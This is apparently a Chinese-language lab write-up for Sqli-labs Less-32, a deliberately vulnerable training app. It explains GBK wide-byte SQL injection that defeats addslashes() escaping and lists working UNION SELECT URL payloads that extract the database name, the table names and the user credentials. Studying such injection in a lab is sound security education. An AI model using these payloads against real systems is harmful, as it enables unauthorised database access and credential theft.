## 题目: Sqli-labs Less-32

## 题目描述
页面提示 `Please input the ID as parameter with numeric value`。底部有 `Hint` 回显，会展示你输入的字符被转义后的样子，以及对应的十六进制编码。

## 核心原理与前置分析
这关的核心考点是**宽字节注入**。通过底部的 `Hint` 可以清楚地看到，当我们输入 `1'` 时，后台的 `addslashes()` 函数会将其转义为 `1\'`（十六进制为 `315c27`）。
反斜杠 `\` 把单引号 `'` 转义成了普通字符，导致我们无法闭合 SQL 语句。

**宽字节注入原理：**
如果数据库使用了 GBK 编码，它是按双字节解析的。当我们故意输入一个 `%df` 时，后台转义会加上一个反斜杠 `%5c`。此时 `%df%5c` 刚好拼成一个合法的汉字（“運”）。这样，反斜杠就被消耗掉了，后面的单引号 `%27` 成功逃逸，闭合生效。

## 解题步骤
**1. 踩坑与复盘（⚠️ 真实踩坑记录）**
* **踩坑一：常规注入失效**。一开始输入 `?id=1'`，页面直接回显了 `Dumb`。这不是因为没漏洞，而是单引号被 `\` 转义成了字符串 `1'`，正好匹配了库里的数据。
* **踩坑二：注释符被吞**。这关不仅转义了单引号，常规的 `--+` 和 `#` 在后面可能也会被吃掉（或者影响到语法），导致闭合出现问题。

**2. 爆库名（验证宽字节逃逸）**
* **输入 URL**：`?id=-1%df' union select 1,database(),3 --+`
* **回显现象**：页面第 2 列成功回显 `security`。这表明 `%df` 成功吃掉了反斜杠，单引号完美闭合。

**3. 爆表名**
* **输入 URL**：`?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`
* **回显现象**：页面成功回显表名 `emails,referers,uagents,users`。

**4. 终极脱库（提取数据）**
* **输入 URL**：`?id=-1%df' union select 1,group_concat(username,0x3a,password),3 from users --+`
* **回显现象**：页面瞬间爆出所有账号密码，包括 `admin:888888` 以及之前注入留下的历史数据。

## 知识点总结
1. **宽字节注入**：利用数据库的编码特性（如 GBK），用 `%df` 配合反斜杠 `%5c` 形成多字节字符，从而“吃掉”转义符，使单引号逃逸。
2. **`addslashes` 绕过**：这是防御 SQL 注入最基础的函数，但在编码不匹配的环境下极易被宽字节绕过。
3. **联合查询脱库**：在确认闭合成功后，利用 `UNION SELECT` 配合 `group_concat` 是最直接、最高效的脱库方式。
